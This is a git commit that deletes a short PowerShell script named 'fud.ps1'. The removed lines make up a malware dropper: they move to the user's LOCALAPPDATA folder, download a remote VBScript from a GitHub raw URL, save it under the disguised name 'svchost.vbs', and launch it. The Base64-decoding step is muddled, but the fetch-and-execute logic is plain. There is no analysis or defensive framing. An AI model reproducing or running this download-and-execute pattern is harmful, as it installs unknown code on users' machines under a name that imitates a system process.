75fc28f4164a4c35792067c9b500e5d9b8d77a2a
achaulien <90228776+achaulien@users.noreply.github.com>
2022-11-18 02:20:44 +0530

    Delete fud.ps1

--- fud.ps1
+++
@@ -1,6 +0,0 @@
-cd $env:LOCALAPPDATA
-
-& ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/achaulien/test/main/loop.vbs" -OutFile svchost.vbs)))) 
-
-cd $env:LOCALAPPDATA
-start "$env:LOCALAPPDATA\svchost.vbs"
